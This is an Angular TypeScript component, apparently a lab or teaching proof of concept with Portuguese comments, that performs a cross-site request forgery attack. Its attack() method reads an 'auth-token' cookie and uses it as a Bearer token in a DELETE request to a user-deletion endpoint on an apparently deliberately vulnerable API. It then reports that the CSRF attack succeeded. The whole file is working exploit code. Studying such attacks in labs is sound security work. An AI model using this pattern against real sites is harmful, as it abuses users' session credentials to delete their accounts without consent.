import { Component } from '@angular/core';
import { HttpClient, HttpHeaders } from '@angular/common/http';

@Component({
  selector: 'app-attack',
  templateUrl: './attack.component.html',
  styleUrls: ['./attack.component.css']
})
export class AttackComponent {
  constructor(private http: HttpClient) {}

  attack() {
    // Tenta pegar o token do cookie primeiro
    const token = document.cookie
      .split('; ')
      .find(row => row.startsWith('auth-token='))
      ?.split('=')[1];
  
    if (!token) {
      console.error('Token não encontrado nos cookies');
      return;
    }
  
    fetch('https://java-vuln-api.onrender.com/auth/deluser/d6591f66-a608-4dce-a4f6-a09c392a1ed3', {
      method: 'DELETE',
      credentials: 'include',
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
      }
    })
    .then(response => {
      if (response.ok) {
        alert('Ataque CSRF bem sucedido!');
      } else {
        throw new Error(`Falha na requisição: ${response.status}`);
      }
    })
    .catch(error => {
      console.error('Erro no ataque CSRF:', error);
      alert('Falha no ataque: ' + error.message);
    });
  }
}